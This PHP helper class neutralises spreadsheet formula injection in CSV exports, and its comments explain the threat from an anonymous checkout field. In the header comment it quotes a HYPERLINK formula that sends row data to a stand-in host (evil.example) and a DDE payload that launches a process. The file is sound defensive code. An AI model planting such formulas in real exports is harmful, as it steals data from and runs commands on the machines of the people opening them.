<?php

declare(strict_types=1);

namespace Iced\Support;

/**
 * Values on their way into a spreadsheet.
 *
 * ── THE ATTACK THIS EXISTS FOR ──────────────────────────────────────────────
 *
 * A CSV is a data file right up until Excel, LibreOffice or Google Sheets opens
 * it, at which point any cell beginning `=`, `+`, `-` or `@` is a FORMULA and
 * the file is a program. `=HYPERLINK("https://evil.example/?x="&A1,"Open")`
 * quietly exfiltrates the row next to it the moment somebody clicks. Excel's
 * legacy DDE syntax — `=cmd|'/c calc'!A1` — goes further and asks to launch a
 * process; modern Excel shows a warning first, which is exactly the warning a
 * finance clerk exporting their own report has been trained to click through.
 *
 * `fputcsv` does not help and is not supposed to: its job is to make the file
 * PARSE correctly, so it quotes separators and escapes quotes. A quoted cell is
 * still a formula when the spreadsheet reads it.
 *
 * ── WHY THIS IS NOT THEORETICAL HERE ────────────────────────────────────────
 *
 * The payments export carries `reference`, and on the non-captured path
 * `PlaceOrderService` takes that string from the checkout request body — length
 * capped and otherwise as typed. So the chain runs: an anonymous shopper places
 * a cash-on-delivery order with a formula in a payment field, finance exports
 * the month, and the payload runs on the workstation of the one person in the
 * building who has every order and every amount in front of them. No account
 * needed at any step.
 *
 * Fixing it at the export rather than at the checkout field is deliberate. The
 * input cap is worth having, but any of a dozen columns could reach a
 * spreadsheet later, and a rule that has to be remembered at every write site is
 * a rule that will be missed at one of them. This is the last place the data
 * passes through before it becomes a spreadsheet, so it is the place the
 * guarantee belongs.
 */
final class Csv
{
    /**
     * The four characters a spreadsheet reads as "this cell is a formula".
     *
     * `-` is on the list and looks like it should not be: a negative amount is
     * an ordinary value. It is here because the spreadsheet cannot tell `-1` from
     * `-1+cmd|…` until it has parsed the cell, and treats a leading `-` as the
     * start of an expression either way. A prefixed `-1` still displays as -1.
     */
    private const FORMULA_PREFIXES = ['=', '+', '-', '@'];

    /**
     * One cell, safe to hand to `fputcsv`.
     *
     * Neutralised with a leading apostrophe, which is the convention every major
     * spreadsheet understands as "the rest of this cell is literal text". It is
     * visible in the formula bar and not in the cell, so a human reading the
     * report sees what was stored.
     *
     * Leading whitespace is stripped before the test, because a tab or a space
     * in front of `=` hides the trigger from a naive check while changing
     * nothing about how the cell is evaluated. Embedded carriage returns and
     * newlines go too: they let one logical row be split across several
     * displayed ones, which is how a malicious value hides itself below the fold
     * of a report somebody is skim-reading.
     */
    public static function cell(mixed $value): string
    {
        $text = (string) $value;

        if ($text === '') {
            return '';
        }

        $text = str_replace(["\r\n", "\r", "\n"], ' ', $text);
        $probe = ltrim($text, " \t");

        if ($probe !== '' && in_array($probe[0], self::FORMULA_PREFIXES, true)) {
            return "'" . $text;
        }

        return $text;
    }

    /**
     * A whole row.
     *
     * @param list<mixed> $row
     *
     * @return list<string>
     */
    public static function row(array $row): array
    {
        return array_map(static fn (mixed $cell): string => self::cell($cell), $row);
    }
}
